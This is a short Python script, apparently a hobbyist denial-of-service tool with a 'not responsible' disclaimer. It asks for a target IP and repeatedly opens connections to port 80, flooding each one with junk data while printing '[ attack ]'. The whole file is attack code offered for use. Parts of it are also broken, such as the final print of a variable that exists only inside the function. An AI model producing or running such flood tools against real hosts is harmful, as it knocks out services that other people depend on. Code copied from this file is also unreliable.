
from pystyle import *
print(Box.Lines(" [×][+]TOLLS TRUB [+][×]"))
Write.Print("[×] WARNING ⚠ L'M NOT RESPONSIBLE FOR ANYTHING YOU USE IN THE TOOL [×]\n",Colors.purple_to_red,interval=0.1)
import time 
from socket import socket , AF_INET, SOCK_STREAM 
def doss(ip_adress):
    s = socket(AF_INET,SOCK_STREAM)
    s.connect((ip_adress,80))
    a = 0
    d = 10
    f = 15
    h = 120
    while a < f:
     a =  a + 1 * f * d * h
     array = [" usjzozhsoshdowhtqbicjcgskdidgsodhdkdhdkdydjdud bat"]
     array = array * a * a 

     for i in array:
         i = str(i).encode("utf-8")
         print(i)
         s.send(i)
         print("\n [ attack ]")
ia = time.sleep(0.2)
ip = input ("[⚠] IP_ADESS [⚠] ")
for i in range(10000):
   doss(ip)
   doss(ip)
   doss(ip)

print(array *10)   